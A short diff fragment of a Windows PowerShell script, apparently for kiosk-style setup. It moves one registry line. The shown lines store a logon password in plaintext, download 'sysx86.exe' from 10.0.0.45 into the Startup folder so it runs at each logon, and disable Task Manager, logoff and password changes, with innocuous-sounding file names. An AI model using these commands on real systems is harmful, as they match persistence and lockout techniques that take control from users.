@@ -12,8 +12,8 @@ Set-ItemProperty $RegPath "DomainUsername" -Value "$DefaultUsername" -type Strin
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 ntrights.exe +r "SeInteractiveLogonRight" -u $DomainUser
 New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Name smbsvcs.bat -Value """C:\Program Files\Internet Explorer\iexplore.exe"" -k ""http://10.0.0.45"""
-Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DisableLockWorkstation" -Value 1
 iwr 10.0.0.45/sysx86.exe 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\sysx86.exe'
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "DisableLockWorkstation" -Value 1
 New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableTaskMgr" -Value 1
 New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "NoLogoff" -Value 1
 New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name "DisableChangePassword" -Value 1
